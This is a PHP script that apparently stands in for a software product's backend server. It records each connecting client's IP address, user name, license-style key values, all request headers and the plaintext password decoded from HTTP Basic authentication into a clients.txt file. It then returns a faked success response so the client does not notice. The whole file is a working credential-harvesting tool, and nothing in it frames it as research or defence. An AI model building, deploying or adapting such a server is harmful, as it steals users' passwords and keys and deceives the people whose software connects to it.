<?php
// Set response headers
header("Content-Type: application/json;charset=UTF-8");
header("Access-Control-Allow-Origin: *"); // Useful for web clients

// Initialize variables to capture
$ip = $_SERVER['REMOTE_ADDR'];
$user = 'unknown';
$key = 'unknown';
$version = 'unknown';

// 1. Capture User (Try Basic Auth first, then params)
if (isset($_SERVER['PHP_AUTH_USER'])) {
    $user = $_SERVER['PHP_AUTH_USER'];
} elseif (isset($_REQUEST['user'])) {
    $user = $_REQUEST['user'];
}

// 2. Capture Key (Try params 'key', 'clef', 'k')
if (isset($_REQUEST['key'])) $key = $_REQUEST['key'];
elseif (isset($_REQUEST['clef'])) $key = $_REQUEST['clef'];
elseif (isset($_REQUEST['k'])) $key = $_REQUEST['k'];

// 3. Capture Version (Try params 'version', 'v', then User-Agent)
if (isset($_REQUEST['version'])) $version = $_REQUEST['version'];
elseif (isset($_REQUEST['v'])) $version = $_REQUEST['v'];
elseif (isset($_SERVER['HTTP_USER_AGENT'])) $version = $_SERVER['HTTP_USER_AGENT'];

// 4. Capture All Headers
if (!function_exists('getallheaders')) {
    function getallheaders() {
        $headers = [];
        foreach ($_SERVER as $name => $value) {
            if (substr($name, 0, 5) == 'HTTP_') {
                $headers[str_replace(' ', '-', ucwords(strtolower(str_replace('_', ' ', substr($name, 5)))))] = $value;
            }
        }
        return $headers;
    }
}
$allHeaders = getallheaders();
$headersStr = json_encode($allHeaders, JSON_UNESCAPED_SLASHES);

// 5. Extract Credentials from Basic Auth
$authHeader = isset($allHeaders['Authorization']) ? $allHeaders['Authorization'] : '';
$extractedUser = '';
$extractedPass = '';

if ($authHeader && strpos($authHeader, 'Basic ') === 0) {
    $encoded = substr($authHeader, 6);
    $decoded = base64_decode($encoded);
    if ($decoded) {
        $parts = explode(':', $decoded, 2);
        if (count($parts) === 2) {
            $extractedUser = $parts[0];
            $extractedPass = $parts[1];
        }
    }
}

// Construct the data signature
$dataSignature = "IP: $ip | User: $user | Key: $key | Version: $version | AuthUser: $extractedUser | AuthPass: $extractedPass | Headers: $headersStr";

// File path for storage (up two levels to root)
$logFile = __DIR__ . '/../../clients.txt';

// Deduplication Logic
// We only write if this exact signature is NOT found in the file.
// Since the file might grow, for a "small server" we simply read it.
// Optimization: Check backwards or just check presence.
$shouldWrite = true;

if (file_exists($logFile)) {
    // Read file into array
    $lines = file($logFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    
    // Check if the signature exists in any line
    foreach ($lines as $line) {
        if (strpos($line, $dataSignature) !== false) {
            $shouldWrite = false;
            break;
        }
    }
}

// Write to file if new
if ($shouldWrite) {
    $timestamp = date('Y-m-d H:i:s');
    $logEntry = "[$timestamp] $dataSignature" . PHP_EOL;
    file_put_contents($logFile, $logEntry, FILE_APPEND | LOCK_EX);
}

// Return expected JSON response (Mocking the Go Backend)
// Indices taken from backend reference: 613, 607, 615, 590, 349, 350, 351, 352, 363, 425, 426, 920
$response = [
    "isconnected" => true,
    "infos" => [613, 607, 615, 590, 349, 350, 351, 352, 363, 425, 426, 920],
    "newversion" => "no"
];

// Force 200 OK
http_response_code(200);
echo json_encode($response);
?>
